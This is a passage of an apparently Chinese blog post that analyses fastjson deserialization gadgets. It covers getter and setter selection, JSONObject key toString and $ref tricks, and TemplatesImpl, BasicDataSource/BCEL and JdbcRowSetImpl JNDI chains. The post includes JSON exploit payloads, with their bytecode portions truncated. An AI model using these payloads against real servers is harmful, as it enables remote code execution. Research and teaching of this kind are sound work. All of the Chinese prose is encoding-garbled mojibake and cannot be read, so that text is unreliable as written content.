<li>æ— å‚æ•°çš„æ„é€ å‡½æ•°</li>
<li>ç¬¦åˆæ¡ä»¶çš„getterå‡½æ•°</li>
<li>ç¬¦åˆæ¡ä»¶çš„setterå‡½æ•°</li>
</ul>
<p>è¿™é‡Œéœ€è¦åŒºåˆ«çš„æ˜¯fastjsonæ‰€ä½¿ç”¨çš„parseå‡½æ•°å’ŒparseObjectå‡½æ•°æ‰€è°ƒç”¨çš„å‡½æ•°æ¡ä»¶æ˜¯ä¸ä¸€æ ·çš„ã€‚ï¼ˆpsï¼šåºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨æ‰€æœ‰gettersï¼‰</p>
<h3 id="1-parse-å’Œ-parseObjectçš„åŒºåˆ«"><a href="#1-parse-å’Œ-parseObjectçš„åŒºåˆ«" class="headerlink" title="1. parse å’Œ parseObjectçš„åŒºåˆ«"></a>1. parse å’Œ parseObjectçš„åŒºåˆ«</h3><p>æ¥çœ‹ä¸€ä¸‹parseObjectå‡½æ•°</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200409201548997.png" alt="image-20200409201548997"></p>
<p>è¿™é‡ŒparseObjectå‡½æ•°ä¼šé¦–å…ˆè°ƒç”¨<code>JSON.parse</code>å‡½æ•°ï¼Œç„¶åå†å»è°ƒç”¨<code>toJSON</code>å‡½æ•°ã€‚</p>
<p>è¿™é‡Œ<code>toJSON</code>ä¼šæŠŠobjå¥—ä¸€å±‚<code>JSONObject</code>å¯¹è±¡ï¼Œä»–çš„å®ç°æ–¹æ³•æ˜¯å…ˆnewä¸€ä¸ª<code>JSONObject</code>ï¼ŒæŠŠobjå¯¹è±¡ç»™å¡«å……è¿›å»ï¼›ç„¶åè°ƒç”¨<code>toJSONString</code>æŠŠç”Ÿæˆçš„<code>JSONObject</code>è½¬åŒ–ä¸ºjsonå­—ç¬¦ä¸²ï¼›æœ€åå†è°ƒç”¨<code>parse</code>å‡½æ•°å°†è¿™ä¸ªjsonå­—ç¬¦ä¸²ç»™è¿˜åŸã€‚</p>
<p>è¿™é‡Œçš„<code>toJSONString</code>æ˜¯æˆ‘ä»¬åºåˆ—åŒ–çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œä»–ä¼šå»è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„æ‰€æœ‰gettersï¼Œä¹Ÿå°±æ„å‘³ç€<code>parseObject</code>å‡½æ•°ä¼šä¸»åŠ¨å»è°ƒgetterså’Œsettersï¼Œè€Œ<code>parse</code>å‡½æ•°åˆ™ä¼šè°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„setterså’Œç¬¦åˆæ¡ä»¶çš„getters(è¿™éƒ¨åˆ†è§åæ–‡)ã€‚</p>
<p>é‚£ä¹ˆä¹Ÿå°±æ„å‘³ç€ï¼Œ<code>parseObject</code>æ¯”<code>parse</code>å‡½æ•°å¤šäº†ä¸€ä¸ªè°ƒç”¨æ‰€æœ‰gettersçš„åˆ©ç”¨ç‚¹ã€‚</p>
<h3 id="2-parseè‡ªåŠ¨è°ƒç”¨å‡½æ•°çš„ä¸»è¦é€»è¾‘"><a href="#2-parseè‡ªåŠ¨è°ƒç”¨å‡½æ•°çš„ä¸»è¦é€»è¾‘" class="headerlink" title="2. parseè‡ªåŠ¨è°ƒç”¨å‡½æ•°çš„ä¸»è¦é€»è¾‘"></a>2. parseè‡ªåŠ¨è°ƒç”¨å‡½æ•°çš„ä¸»è¦é€»è¾‘</h3><p>æ¥ç€æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹<code>JSON.parse</code>å‡½æ•°è‡ªåŠ¨è°ƒç”¨getterså’Œsettersçš„é€»è¾‘ã€‚</p>
<p>å…ˆæ¥çœ‹ä¸€ä¸‹è°ƒç”¨æµç¨‹ï¼Œä»¥ä¸‹åˆ†æfastjsonç‰ˆæœ¬1.2.24</p>
<p><code>com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java#deserialze</code>ï¼ˆpsï¼šè¿™é‡Œå¾ˆé¸¡è´¼çš„æŠŠdeserializeçš„iç»™çœç•¥äº†ï¼‰</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106094637943.png" alt="image-20200106094637943"></p>
<p>é¦–å…ˆæ˜¯ç¬¬570è¡Œè°ƒç”¨äº†createInstanceå‡½æ•°ï¼Œè¯¥å‡½æ•°å°†ä¼šå¯¹å½“å‰è¿˜åŸçš„ç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™é‡Œä¼šè‡ªåŠ¨è°ƒç”¨æ— å‚æ•°çš„æ„é€ å‡½æ•°</p>
<p>å…¶æ¬¡æ˜¯ç¬¬600è¡Œè°ƒç”¨äº†parseFieldå‡½æ•°ï¼Œè¯¥å‡½æ•°å°†å¯¹æ¯ä¸ªç±»å±æ€§è¿›è¡Œåˆå§‹åŒ–(æˆ–é€’å½’ç”Ÿæˆæ–°çš„å¯¹è±¡)</p>
<p>è·Ÿè¿›parseFieldå‡½æ•°</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106105841139.png" alt="image-20200106105841139"></p>
<p>è¿™é‡Œè°ƒç”¨äº†<code>com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java#parseField</code>å‡½æ•°ï¼Œç›´æ¥çœ‹å…³é”®ç‚¹ç¬¬83è¡Œï¼Œè°ƒç”¨äº†setValueå‡½æ•°</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106110005828.png" alt="image-20200106110005828"></p>
<p>setValueå‡½æ•°å°±æ˜¯fastjsonè‡ªåŠ¨è°ƒç”¨getterå’Œsetterçš„å…³é”®ç‚¹</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106110837420.png" alt="image-20200106110837420"></p>
<p>å¦‚æœä¸å­˜åœ¨ç›¸åº”çš„getterã€setterã€iså‡½æ•°ï¼Œåˆ™åˆ©ç”¨åå°„æœºåˆ¶å°†valueèµ‹å€¼åˆ°å½“å‰çš„objectä¸Šï¼ˆè¿™é‡Œå°±æ˜¯elseéƒ¨åˆ†åšçš„äº‹æƒ…ï¼‰ã€‚</p>
<p>è€Œå½“fieldInfoå­˜åœ¨å‡½æ•°æ—¶ï¼Œå¦‚æœåŒæ—¶å­˜åœ¨getterå’Œsetterï¼Œåˆ™è°ƒç”¨setterï¼Œå¦‚æœåªå­˜åœ¨getteråˆ™è°ƒç”¨getterã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬å…³æ³¨ä¸€ä¸‹fieldInfoçš„methodæ˜¯æ€ä¹ˆå¡«å……çš„å‘¢ï¼Ÿè¿™é‡Œè¦çœ‹<code>com/alibaba/fastjson/util/JavaBeanInfo.java#build</code>å‡½æ•°ï¼ŒParserConfigåœ¨<code>createJavaBeanDeserializer</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨<code>JavaBeanInfo.build</code>å‡½æ•°ï¼Œä»¥æ­¤å¡«å……fieldInfoï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦åˆ†æçš„å‡ ä¸ªmethodã€‚</p>
<p>ä¸çœ‹å…·ä½“çš„ä»£ç ï¼Œå†™ä¸€ä¸‹ç­›é€‰çš„æ¡ä»¶ï¼š</p>
<p>setteræå–æ¡ä»¶ï¼š</p>
<ul>
<li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4</li>
<li>éé™æ€å‡½æ•°</li>
<li>é™åˆ¶è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»</li>
<li>å‡½æ•°å‚æ•°åªæœ‰ä¸€ä¸ª</li>
<li>å‡½æ•°åä»¥setå¼€å¤´ï¼Œç¬¬å››ä¸ªå­—ç¬¦æ˜¯å¤§å†™æˆ–è€…<code>unicde</code>æˆ–è€…<code>_</code>æˆ–è€…å­—æ¯fï¼›å¦‚æœå‡½æ•°åé•¿åº¦&gt;=5ï¼Œçœ‹ç¬¬5ä½å­—ç¬¦æ˜¯ä¸æ˜¯å¤§å†™çš„</li>
</ul>
<p>getteræå–æ¡ä»¶ï¼š</p>
<ul>
<li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4</li>
<li>éé™æ€å‡½æ•°</li>
<li>å‡½æ•°åä»¥getå¼€å¤´ï¼Œç¬¬å››ä¸ªå­—ç¬¦å¤§å†™</li>
<li>å‡½æ•°å‚æ•°ä¸º0ä¸ª</li>
<li>å‡½æ•°çš„è¿”å›ç±»å‹ä¸ºCollectionçš„å­ç±»æˆ–æœ¬èº«ã€Mapçš„å­ç±»æˆ–æœ¬èº«ã€AtomicBooleanã€AtomicIntegerã€AtomicLong</li>
<li>æ— ç›¸å¯¹åº”çš„setterå‡½æ•°</li>
</ul>
<p>ç»è¿‡ä¸Šè¿°çš„ä¸¤ä¸ªæ¡ä»¶æå–åï¼Œä¿ç•™äº†ç¬¦åˆæ¡ä»¶çš„getterå’Œsetterï¼Œå¹¶äº<code>com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValue</code>å‡½æ•°ä¸­invokeè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å®ç°äº†ç±»ä¼¼ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¸»åŠ¨è°ƒç”¨readObjectå‡½æ•°çš„æ•ˆæœã€‚</p>
<p>çŸ¥é“äº†ä¸Šè¿°çš„æ¡ä»¶ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¼ å…¥æŸå­—æ®µçš„æ–¹å¼æ¥ä¸»åŠ¨è°ƒç”¨ç›¸å…³ç¬¦åˆæ¡ä»¶çš„setterå’Œgetterã€‚ä¾‹å¦‚åœ¨Personé‡Œé¢æ·»åŠ ä¸€ä¸ªsetTestå‡½æ•°ï¼Œå¹¶åœ¨éœ€è¦è½¬åŒ–çš„jsonä¸­æ·»åŠ <code>&quot;test&quot;:1</code>ï¼Œå°†ä¼šä¸»åŠ¨è°ƒç”¨<code>setTest</code>ã€‚</p>
<p>æˆ‘ä»¬åœ¨åˆ©ç”¨<code>@type</code>æ„é€ æœ‰å±å®³çš„åˆ©ç”¨é“¾æ—¶ï¼Œä¸»è¦å°±æ˜¯æŸ¥æ‰¾æœ‰å±å®³çš„æ— å‚æ•°çš„æ„é€ å‡½æ•°ã€ç¬¦åˆæ¡ä»¶çš„getterå’Œsetterã€‚</p>
<h3 id="3-çªç ´parseä¸èƒ½è°ƒç”¨æ‰€æœ‰gettersçš„é™åˆ¶"><a href="#3-çªç ´parseä¸èƒ½è°ƒç”¨æ‰€æœ‰gettersçš„é™åˆ¶" class="headerlink" title="3. çªç ´parseä¸èƒ½è°ƒç”¨æ‰€æœ‰gettersçš„é™åˆ¶"></a>3. çªç ´parseä¸èƒ½è°ƒç”¨æ‰€æœ‰gettersçš„é™åˆ¶</h3><p>è¿™é‡Œçš„çªç ´æ€è·¯ä¸»è¦æœ‰ä¸¤ä¸ªï¼š</p>
<ol>
<li>tomcat bcelçš„poc</li>
<li>threedreamå¸ˆå‚…å‘ç°çš„<a href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6" target="_blank" rel="noopener">å¼•ç”¨</a>çš„æ–¹å¼</li>
</ol>
<h4 id="ç¬¬ä¸€ç§ï¼šTomcat-BCEL-POCæ€è·¯"><a href="#ç¬¬ä¸€ç§ï¼šTomcat-BCEL-POCæ€è·¯" class="headerlink" title="ç¬¬ä¸€ç§ï¼šTomcat BCEL POCæ€è·¯"></a>ç¬¬ä¸€ç§ï¼šTomcat BCEL POCæ€è·¯</h4><p>è¿™ä¸ªpocå·§å¦™çš„åˆ©ç”¨äº†<code>JSONObject.toString</code>å‡½æ•°ï¼Œå…ˆæ¥çœ‹çœ‹è¿™ä¸ª<code>toString</code></p>
<p>è¿™ä¸ª<code>toString</code>ç»§æ‰¿è‡ª<code>JSON</code></p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200410110654354.png" alt="image-20200410110654354"></p>
<p>è¿™é‡Œä»–ç›´æ¥è°ƒç”¨äº†<code>toJSONString</code>å‡½æ•°</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200410110738399.png" alt="image-20200410110738399"></p>
<p>çœ‹åˆ°åç»­ä»–å°†å½“å‰è¿™ä¸ªJSONObjectå®ä¾‹è¿›è¡Œäº†obj to strçš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨é™æ€å‡½æ•°<code>JSON.toJSONString</code>æ¥åºåˆ—åŒ–æ•°æ®ä¸€æ ·ï¼Œè¿™é‡Œå°†ä¼šè°ƒç”¨å½“å‰è¿™ä¸ªç±»çš„æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„gettersï¼ˆè¿™é‡Œçš„æ¡ä»¶æ¯”è°ƒç”¨parseæ—¶å®½æ¾ï¼Œä»–å¯¹è¿”å›ç±»å‹æ— é™åˆ¶ï¼‰ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªè¦åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œæ‰¾åˆ°ä¸€å¤„å¯ä»¥ä½¿ç”¨JSONObjectè°ƒç”¨toStringçš„åœ°æ–¹å°±å¯ä»¥äº†</p>
<p><code>com/alibaba/fastjson/parser/DefaultJSONParser.java#parseObject</code></p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200410121100651.png" alt="image-20200410121100651"></p>
<p>è¿™é‡Œæœ‰ä¸€å¤„å¦‚æœå½“å‰objectä¸ºJSONObjectç±»å‹æ—¶ï¼Œå°†ä¼šå¯¹å½“å‰çš„è¿™ä¸ªkeyè°ƒç”¨<code>toString</code>å‡½æ•°ã€‚è¿™é‡Œåœ¨å¤„ç†è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å¦‚æœé‡åˆ°<code>{</code>ï¼Œfastjsonä¼šåŠ ä¸€å±‚JSONObjectã€‚</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200410122509759.png" alt="image-20200410122509759"></p>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ªç±»ä¼¼</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;some&#125;:x&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ç§æ–¹å¼ï¼Œæ­¤æ—¶çš„keyä¸º<code>{}</code>(ä¹Ÿå°±æ˜¯ä¸‹ä¸€å±‚çš„JSONObject)ï¼Œvalueä¸º<code>x</code>ã€‚æˆ‘ä»¬å°±å¯ä»¥ä½¿å¾—fastjsonå»è°ƒç”¨<code>key.toString</code>å‡½æ•°ï¼Œè¿™ä¸ª<code>toString</code>çš„è¿‡ç¨‹ä¹Ÿå°±æ˜¯å°†keyè°ƒç”¨<code>toJSONString</code>çš„è¿‡ç¨‹ï¼Œæ„å‘³ç€å°†ä¼šè°ƒç”¨å½“å‰keyå¯¹è±¡çš„æ‰€æœ‰gettersã€‚åˆ°è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ä½¿parseå‡½æ•°æ‹¥æœ‰ä¸parseObjectä¸€æ ·çš„æ‰§è¡Œæ•ˆæœï¼Œä»¥ä¸‹é¢çš„pocä¸ºä¾‹ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">// ç¬¬ä¸€å±‚JSONObjectï¼Œä»–çš„keyä¸ºå¦å¤–ä¸€ä¸ªJSONObject</span></span><br><span class="line">		&#123;// ä¸‹ä¸€å±‚JSONObjectï¼Œä»–çš„å†…å®¹å°†ä¼šè°ƒç”¨toJSONString</span><br><span class="line">			"x":&#123;// å…·ä½“è§¦å‘ç‚¹ä¸ºgetConnection</span><br><span class="line">				"@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",</span><br><span class="line">				"driverClassLoader": &#123;"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"&#125;,		</span><br><span class="line">        "driverClassName": "$$BCEL$$$l$8b$I$A$..."</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;:"x"</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="ç¬¬äºŒç§ï¼š-refç‚¹"><a href="#ç¬¬äºŒç§ï¼š-refç‚¹" class="headerlink" title="ç¬¬äºŒç§ï¼š$refç‚¹"></a>ç¬¬äºŒç§ï¼š<code>$ref</code>ç‚¹</h4><p>å½“fastjsonç‰ˆæœ¬&gt;=1.2.36æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>$ref</code>çš„æ–¹å¼æ¥è°ƒç”¨ä»»æ„çš„getter</p>
<p>ä»¥1.2.48ç‰ˆæœ¬ä¸ºä¾‹ï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹é‡åˆ°<code>$ref</code>æ˜¯æ€ä¹ˆå¤„ç†çš„</p>
<p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject#388</code></p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411145506512.png" alt="image-20200411145506512"></p>
<p>å½“é‡åˆ°å¼•ç”¨<code>$ref</code>è¿™ç§æ–¹å¼ï¼Œä¼šå¢åŠ ä¸€ä¸ªresolveTaskï¼Œç•™åœ¨parseç»“æŸåè¿›è¡Œå¤„ç†</p>
<p><code>com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask</code></p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411145811138.png" alt="image-20200411145811138"></p>
<p>è°ƒç”¨<code>JSONPath.eval</code>ï¼Œå…³äºJSONPathçš„<a href="https://github.com/alibaba/fastjson/wiki/JSONPath" target="_blank" rel="noopener">ä»‹ç»</a></p>
<p>è¿™é‡Œçš„evalå‡½æ•°æœ€ç»ˆä¼šå»è°ƒç”¨<code>JSONPath.getPropertyValue</code>å‡½æ•°ï¼ˆè¿™é‡Œå…¶å®æ˜¯å¯ä»¥æ ¹æ®æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹å»è°ƒç”¨ä¸åŒçš„Segementï¼Œæ¯”å¦‚è¿™é‡Œç”¨äº†<strong>$.value</strong>çš„æ–¹å¼ä½¿ç”¨çš„æ˜¯PropertySegementï¼‰</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411153340074.png" alt="image-20200411153340074"></p>
<p>åç»­å°±ä¸è¯¦ç»†åˆ†æäº†ï¼Œè¿™é‡Œå¦‚æœå­˜åœ¨ç›¸åº”çš„getterï¼Œå°±ä¼šå»invokeè¿™ä¸ªå‡½æ•°ï¼›å¦‚æœæ²¡æœ‰ï¼Œé‚£ä¹ˆå°±ä¼šç”¨åå°„æœºåˆ¶å»è·å–å±æ€§çš„å€¼ã€‚</p>
<p>è¿™é‡Œä¸¾ä¸ªä¾‹å­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">json = <span class="string">"&#123;"</span> +</span><br><span class="line">          <span class="string">"\"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\","</span> +</span><br><span class="line">          <span class="string">"\"driverClassLoader\": &#123;\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"&#125;,"</span> +</span><br><span class="line">          <span class="string">"\"driverClassName\": \"$$BCEL$$$l$8b$I$A$...\","</span> +</span><br><span class="line">          <span class="string">"\"connection\":&#123;\"$ref\": \"$.connection\"&#125;"</span>+</span><br><span class="line">				<span class="string">"&#125;"</span>;</span><br></pre></td></tr></table></figure>
<p>ä¼šå»è°ƒç”¨<code>getConnection</code>å‡½æ•°ï¼Œè¿™é‡Œä¹Ÿçªç ´äº†parseåˆ°parseObjectçš„æ•ˆæœ</p>
<h2 id="4-privateå±æ€§"><a href="#4-privateå±æ€§" class="headerlink" title="(4). privateå±æ€§"></a>(4). privateå±æ€§</h2><p>è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯é»˜è®¤fastjonåœ¨è½¬åŒ–æ—¶ï¼Œå¦‚æœæ²¡æœ‰setterå‡½æ•°ï¼Œè€Œæ˜¯ä»¥åå°„æœºåˆ¶æ¥èµ‹å€¼çš„æƒ…å†µï¼Œä¼šå¿½ç•¥privateå±æ€§çš„è½¬åŒ–ã€‚æ„å‘³ç€å¦‚æœæˆ‘ä»¬åœ¨æ„é€ è¿‡ç¨‹ä¸­ï¼Œå¡«å……è¿›å»çš„å±æ€§æ˜¯privateçš„ä¸”æ²¡æœ‰setterï¼Œé‚£ä¹ˆåœ¨è½¬åŒ–è¿‡ç¨‹ä¸­æ˜¯ä¸ä¼šè¢«å¡«å…¥è¿˜åŸåçš„å¯¹è±¡çš„ã€‚å¦‚æœéœ€è¦å¯¹privateå±æ€§è¿›è¡Œè½¬åŒ–ï¼Œé‚£ä¹ˆéœ€è¦è®¾ç½®<code>Feature.SupportNonPublicField</code></p>
<h1 id="0x02-EXPåˆ†æ"><a href="#0x02-EXPåˆ†æ" class="headerlink" title="0x02 EXPåˆ†æ"></a>0x02 EXPåˆ†æ</h1><hr>
<p>ç›¸æ¯”äºJavaååºåˆ—åŒ–åˆ©ç”¨é“¾æ„é€ çš„å¤æ‚æ€§ï¼Œfastjsonåˆ©ç”¨é“¾ä¸»è¦æ˜¯å¯»æ‰¾å¯åˆ©ç”¨çš„getterã€setterç­‰ï¼Œå¸¸è§çš„å‡ ç§POCå¦‚ä¸‹æ–‡æ‰€ç¤ºï¼š</p>
<h2 id="1-templatesimpl"><a href="#1-templatesimpl" class="headerlink" title="(1). templatesimpl"></a>(1). templatesimpl</h2><p>å‚è€ƒï¼š<a href="http://xxlegend.com/2017/05/03/title- fastjson è¿œç¨‹ååºåˆ—åŒ–pocçš„æ„é€ å’Œåˆ†æ/" target="_blank" rel="noopener">http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p>
<p>æ ¹æ®å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„æ„é€ å‡½æ•°ã€setteræˆ–getterå‡½æ•°ã€‚åœ¨åˆ†æCommons-Collectionsç³»ç»Ÿçš„åˆ©ç”¨é“¾æ—¶ï¼Œæåˆ°è¿‡templatesimplçš„æ‰§è¡Œæ–¹å¼ï¼Œé€šè¿‡è½½å…¥bytecodesçš„æ–¹å¼æ¥è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœ(å…·ä½“ä¸å†åˆ†æ)ã€‚</p>
<p>å…¶ä¸­è§¦å‘è½½å…¥çš„å‡½æ•°ä¸º<code>newTransformer</code>å‡½æ•°ï¼Œè€Œå¾ˆå·§çš„æ˜¯ï¼Œtemplatesimplå­˜åœ¨ä¸€ä¸ªgetterè°ƒç”¨äº†è¯¥å‡½æ•°</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106232029570.png" alt="image-20200106232029570"></p>
<p>é‚£ä¹ˆå¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å¡«å…¥<code>outputProperties</code>çš„æ–¹æ³•æ¥è§¦å‘<code>getOutputProperties</code>ï¼ˆä»–æ°å·§æ— setterï¼Œè¿”å›å€¼ä¹Ÿç¬¦åˆæ¡ä»¶ï¼‰ã€‚ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯æˆ‘ä»¬éœ€è¦å¡«å……çš„ç±»å±æ€§éƒ½æ˜¯privateç±»å‹ï¼Œè¦æƒ³æ‰§è¡Œè¯¥åˆ©ç”¨é“¾ï¼Œéœ€è¦åœ¨è°ƒç”¨parseObjectå‡½æ•°æ—¶å¡«å…¥<code>Feature.SupportNonPublicField</code>ã€‚ä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œå°†è°ƒç”¨è®¡ç®—å™¨</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String jsonString = <span class="string">"&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\","</span> +</span><br><span class="line">        <span class="string">"\"_name\":\"goodjob\",\"_tfactory\":&#123;&#125;,"</span> +</span><br><span class="line">        <span class="string">"\"_bytecodes\":[\"yv66vgAAADQAOgoAA...\"],"</span> +</span><br><span class="line">        <span class="string">"\"_outputProperties\":null&#125;"</span>;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„bytecodeså¯ä»¥ç”¨ysoserialå·¥å…·æ¥ç”Ÿæˆã€‚åœ¨æ„é€ payloadçš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<code>_tfactory</code>å¿…é¡»å¡«ä¸Šï¼Œå› ä¸ºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœå®ƒä¸ºnullï¼Œä¼šæŠ¥é”™æ— æ³•è¿›å…¥è½½å…¥bytecodesçš„æ­¥éª¤ã€‚éå¸¸å¥½çš„æ˜¯ï¼Œæˆ‘ä»¬åªè¦å¡«ä¸Š<code>_tfactory:{}</code>ï¼Œfastjsonä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬è°ƒç”¨TransformerFactoryImplï¼ˆ<em>tfactoryçš„ç±»ï¼‰çš„æ— å‚æ„é€ å‡½æ•°è¿›è¡Œå®ä¾‹åŒ–ã€‚`\</em>`åœ¨smartMatchå‡½æ•°è¢«æ›¿æ¢ä¸ºç©ºã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œbyte[]ç±»å‹åœ¨fastjsonè½¬åŒ–ä¸­ä¼šè¢«base64ç¼–ç </p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106233142450.png" alt="image-20200106233142450"></p>
<p>æ‰€ä»¥payloadä¸­æ˜¯ä¸€é•¿ä¸²base64çš„å­—ä¸²ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªpocå…¶å®é™åˆ¶è¿˜æ˜¯æŒºå¤§çš„ï¼Œéœ€è¦fastjson parseObjectæ—¶å¡«ä¸Š<code>Feature.SupportNonPublicField</code>æ‰å¯ä»¥ã€‚</p>
<h2 id="2-åŸºäºJNDIçš„åˆ©ç”¨"><a href="#2-åŸºäºJNDIçš„åˆ©ç”¨" class="headerlink" title="(2). åŸºäºJNDIçš„åˆ©ç”¨"></a>(2). åŸºäºJNDIçš„åˆ©ç”¨</h2><p>æˆ‘ä»¬éƒ½çŸ¥é“å¦‚æœJNDIçš„lookupå‡½æ•°å‚æ•°å€¼å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨JNDI Referenceçš„æ–¹æ³•åŠ è½½è¿œç¨‹ä»£ç è¾¾æˆRCEåˆ©ç”¨ã€‚æ‰€ä»¥æ ¹æ®å‰é¢çš„åˆ†æï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨<code>æ— å‚æ„é€ å‡½æ•°</code>ã€<code>ç¬¦åˆæ¡ä»¶çš„setter</code>ã€<code>ç¬¦åˆæ¡ä»¶çš„getter</code>é‡Œå‘ç°ä¸€ä¸ªå¯æ§çš„lookupå‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨JNDIçš„æ³¨å…¥æ–¹æ³•æ¥è¾¾æˆåˆ©ç”¨ã€‚</p>
<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>JdbcRowSetImplå¯¹è±¡å¯ä»¥è¢«æˆ‘ä»¬ç”¨åšä¸Šè¿°çš„åˆ©ç”¨ï¼Œæ¥çœ‹ä¸€ä¸‹ä»–çš„ä»£ç </p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200407105109680.png" alt="image-20200407105109680"></p>
<p>è¿™æ¬¡å‡ºé—®é¢˜çš„åœ°æ–¹åœ¨äºsetAutoCommitå‡½æ•°ï¼Œè¯¥å‡½æ•°è°ƒç”¨äº†connectå‡½æ•°æ¥é‡æ–°å‘èµ·ä¸€ä¸ªjdbcçš„è¿æ¥</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200407105258958.png" alt="image-20200407105258958"></p>
<p>åœ¨connectå‡½æ•°é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†lookupå‡½æ•°ï¼Œå…¶å‚æ•°å€¼ç”±<code>getDataSourceName</code>æ¥è·å–ï¼Œè¯¥å‡½æ•°ä¸»è¦è¿”å›å±æ€§<code>dataSource</code>ï¼Œæ ¹æ®fastjsonçš„åˆ©ç”¨åŸç†ï¼Œæˆ‘ä»¬åªéœ€è¦å¡«å……<code>dataSource</code>å’Œ<code>autoCommit</code>å°±å¯ä»¥è§¦å‘è¿™é‡Œçš„JNDIæ³¨å…¥ã€‚</p>
